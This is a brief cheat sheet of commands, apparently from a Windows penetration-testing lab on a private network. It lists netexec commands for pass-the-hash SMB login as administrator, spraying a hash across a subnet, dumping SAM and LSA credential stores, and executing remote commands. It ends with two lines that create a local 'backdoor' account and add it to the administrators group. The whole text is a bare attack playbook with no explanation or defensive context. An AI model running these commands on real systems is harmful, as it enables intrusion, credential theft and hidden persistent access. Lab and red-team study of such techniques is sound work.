
Commands Used

SMB Authentication

netexec smb 192.168.56.10 -u administrator -H <hash>

Subnet Scan

netexec smb 192.168.56.10/24 -u administrator -H <hash>

Credential Dumping

netexec smb <target> --sam
netexec smb <target> --lsa

Command Execution

netexec smb <target> -x "whoami"

Persistence

net user backdoor Pass@123 /add
net localgroup administrators backdoor /add
